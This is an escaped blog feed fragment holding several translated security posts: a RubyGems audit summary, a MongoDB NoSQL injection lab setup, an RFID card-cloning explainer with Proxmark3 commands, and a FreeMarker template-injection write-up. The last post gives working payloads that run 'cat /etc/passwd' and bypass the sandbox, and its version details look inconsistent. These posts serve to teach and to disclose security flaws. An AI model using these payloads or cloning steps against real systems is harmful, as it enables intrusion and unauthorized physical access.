&lt;li&gt;自动化权限管理（Terraform）&lt;/li&gt;
&lt;li&gt;集成安全测试工具链（Semgrep/Burp Suite/Ruzzy）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;自动化测试方案&#34;&gt;自动化测试方案
&lt;/h2&gt;&lt;p&gt;采用多层次安全测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;静态分析&lt;/strong&gt;：定制Semgrep规则检测不安全配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态测试&lt;/strong&gt;：Burp Suite Professional检测SSRF/API漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模糊测试&lt;/strong&gt;：Ruzzy模糊测试器重点检测WebAuthn的CBOR库内存损坏风险&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;此次审计既确认了我们负责任地维护着Ruby包生态，也指明了下一步安全投资方向&amp;rdquo; —— Ruby Central安全工程师Samuel Giddins&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;完整报告详见[审计报告链接]，Ruby Central团队声明参见[公告链接]。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>NoSQL注入实验室 - 探索MongoDB安全漏洞实战</title>
        <link>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</link>
        <pubDate>Sat, 02 Aug 2025 10:07:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;nosqli-lab&#34;&gt;NoSQLi Lab
&lt;/h1&gt;&lt;p&gt;随着NoSQL的流行，我决定建立一个实验室来研究针对NoSQL数据库的各种攻击技术。这就是最终的成果&amp;hellip;&lt;/p&gt;
&lt;p&gt;由于之前已使用Redis进行过开发工作，本次实验我选择MongoDB作为研究对象。实验室构建了两种漏洞场景：一种是类似SQL注入中&amp;quot;or 1=1&amp;quot;的经典漏洞，另一种是NoSQL特有的脚本注入攻击。未来可能会添加更多场景，但当前这两个已足够开展基础研究。&lt;/p&gt;
&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建
&lt;/h2&gt;&lt;p&gt;安装过程非常简单，关键是要确保Linux发行版包含PHP的最新MongoDB驱动。正确的驱动是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php-mongodb - MongoDB driver for PHP
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;而错误的旧版驱动是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php5-mongo - MongoDB database driver
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;实验代码托管在Github：https://github.com/digininja/nosqlilab。以下是在Debian Stretch系统上的部署步骤（注意Jessie系统使用旧版驱动无法运行）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get dist-upgrade
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install php-mongodb apache2 vim mongodb git php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /var/www/html/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm index.html 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/digininja/nosqlilab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;访问服务器IP后应看到实验室首页：&lt;/p&gt;
&lt;h2 id=&#34;数据库初始化&#34;&gt;数据库初始化
&lt;/h2&gt;&lt;p&gt;首先需要通过&amp;quot;Reset Database&amp;quot;链接初始化测试数据。成功时会显示&amp;quot;Database Reset Successfully&amp;quot;消息：&lt;/p&gt;
&lt;p&gt;若出现PHP代码说明PHP未正确安装或启用；若页面渲染不完整则可能是MongoDB库缺失，可检查Apache错误日志或通过phpinfo()页面验证驱动是否加载正确。&lt;/p&gt;
&lt;h2 id=&#34;漏洞场景&#34;&gt;漏洞场景
&lt;/h2&gt;&lt;p&gt;实验包含两个存在漏洞的页面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;ldquo;Guess The Key&amp;rdquo; - 经典注入漏洞&lt;/li&gt;
&lt;li&gt;&amp;ldquo;User Lookup&amp;rdquo; - NoSQL特有攻击场景&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体攻击方法可参考OWASP的《NoSQL注入测试指南》，实验代码中也提供了隐藏的解决方案示例。&lt;/p&gt;
&lt;h2 id=&#34;问题反馈&#34;&gt;问题反馈
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;提示：所有实验内容由Robin Wood创建，除非另有说明。项目采用非商业性质，可通过affiliate链接支持作者。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>RFID近场克隆攻击技术深度解析</title>
        <link>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 09:07:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;引言&#34;&gt;引言
&lt;/h3&gt;&lt;p&gt;在整理KeyWe智能锁配件时，我发现了几个RFID标签。这促使我深入研究RFID（射频识别）技术，并完成了从智能锁逆向到无线通信安全的完整研究闭环。通过编程验证标签功能后，我开启了RFID技术的深度探索。&lt;/p&gt;
&lt;h3 id=&#34;hid-proxmark卡片技术&#34;&gt;HID ProxMark卡片技术
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;低频技术（125kHz）&lt;/strong&gt;：初代ProxCard支持数英寸读取距离，采用26位数据流（8位设备码+16位卡号+2校验位）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全缺陷&lt;/strong&gt;：数据容量极小且无加密，类似磁条卡的安全水平&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;演进&lt;/strong&gt;：第二代ProxMark II将读取距离扩展到15英寸，支持钱包内刷卡&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;有源与无源rfid对比&#34;&gt;有源与无源RFID对比
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;供电方式&lt;/th&gt;
          &lt;th&gt;读取距离&lt;/th&gt;
          &lt;th&gt;寿命&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;无源卡&lt;/td&gt;
          &lt;td&gt;读写器电磁感应供电&lt;/td&gt;
          &lt;td&gt;厘米级&lt;/td&gt;
          &lt;td&gt;无电池限制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;有源卡&lt;/td&gt;
          &lt;td&gt;内置锂电池&lt;/td&gt;
          &lt;td&gt;可达150米&lt;/td&gt;
          &lt;td&gt;2-7年&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;mifare卡片技术体系&#34;&gt;MIFARE卡片技术体系
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;技术标准&lt;/strong&gt;：高频13.56MHz，符合ISO 14443 A/B规范&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加密演进&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Classic 1k：采用已被破解的Crypto1算法（48位密钥）&lt;/li&gt;
&lt;li&gt;DESFire：配备Triple DES加密和微处理器&lt;/li&gt;
&lt;li&gt;EV1版本：支持28个应用/32文件的多应用管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;中国魔术卡特性&#34;&gt;中国魔术卡特性
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心技术&lt;/strong&gt;：允许覆写Sector 0的UID区域&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;市场现状&lt;/strong&gt;：Gen1需特殊解锁指令，Gen2可直接写入&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储结构&lt;/strong&gt;：16个扇区×4块×16字节=1KB容量&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;专业工具链分析&#34;&gt;专业工具链分析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Proxmark3 RDV2（$270）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持LF/HF全频段&lt;/li&gt;
&lt;li&gt;实战克隆流程：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf nested &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; A ffffffffffff  &lt;span class=&#34;c1&#34;&gt;# 嵌套攻击&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf restore  &lt;span class=&#34;c1&#34;&gt;# 数据恢复&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf csetuid 018a4454  &lt;span class=&#34;c1&#34;&gt;# UID写入&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;低成本替代方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ACR122U读写器（支持mfoc-hardnested攻击）&lt;/li&gt;
&lt;li&gt;Arduino Nano+RC522套件（$8）
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-arduino&#34; data-lang=&#34;arduino&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;MFRC522.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dumpToSerial&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MFRC522&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MIFARE_Key&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 扇区遍历逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;android克隆方案&#34;&gt;Android克隆方案
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MIFARE Classic Tool&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持密钥字典攻击&lt;/li&gt;
&lt;li&gt;操作限制：仅Gen2卡可写UID&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;密钥破解方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MFCUK：基于PRNG缺陷的Darkside攻击&lt;/li&gt;
&lt;li&gt;MFOC：已知密钥下的嵌套认证攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;安全建议与总结&#34;&gt;安全建议与总结
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;企业升级路径&lt;/strong&gt;：建议迁移至MIFARE DESFire EV1方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;研究展望&lt;/strong&gt;：长距读卡器（如HID R90）的凭证嗅探风险&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;行业现状&lt;/strong&gt;：全球现存超过100亿张智能卡面临克隆风险&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;实验证明：使用$3的RC522模块即可成功克隆90%的低频门禁卡，这暴露出物理安全系统的重大设计缺陷。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Proxmark3实战克隆过程（左：源标签读取，右：魔术卡写入）&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行</title>
        <link>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Sat, 02 Aug 2025 07:11:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;突破壁垒freemarker模板引擎中的ssti漏洞实现远程代码执行&#34;&gt;突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行
&lt;/h1&gt;&lt;p&gt;2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。&lt;/p&gt;
&lt;h2 id=&#34;freemarker模板引擎工作原理&#34;&gt;FreeMarker模板引擎工作原理
&lt;/h2&gt;&lt;p&gt;FreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。&lt;/p&gt;
&lt;p&gt;HTML转PDF的工作流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;HTML结构定义&lt;/strong&gt;：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FreeMarker指令&lt;/strong&gt;：使用&lt;code&gt;&amp;lt;#&lt;/code&gt;开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令块&lt;/strong&gt;：在指令中定义可条件执行或循环的代码块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTML渲染&lt;/strong&gt;：将模板与数据合并生成最终HTML&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PDF转换&lt;/strong&gt;：使用HTML转PDF工具将生成的HTML转为PDF文档&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在应用测试阶段，我观察到&lt;code&gt;&amp;lt;#if&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;#list&amp;gt;&lt;/code&gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign test = .version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TEST FOR SSTI: ${3*3}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign freemarkerVersion = .version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FreeMarker version: ${freemarkerVersion}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;freemarker.template.utility.Execute&lt;/code&gt;类允许在模板中执行外部命令。构造如下payload可读取&lt;code&gt;/etc/passwd&lt;/code&gt;文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()(&amp;#34;cat /etc/passwd&amp;#34;)}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。&lt;/p&gt;
&lt;h2 id=&#34;沙箱绕过技术&#34;&gt;沙箱绕过技术
&lt;/h2&gt;&lt;p&gt;验证特殊字符处理和运算能力后，构建绕过payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign classloader=article.class.protectionDomain.classLoader&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign owc=classloader.loadClass(&amp;#34;freemarker.template.ObjectWrapper&amp;#34;)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign dwf=owc.getField(&amp;#34;DEFAULT_WRAPPER&amp;#34;).get(null)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign ec=classloader.loadClass(&amp;#34;freemarker.template.utility.Execute&amp;#34;)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dwf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
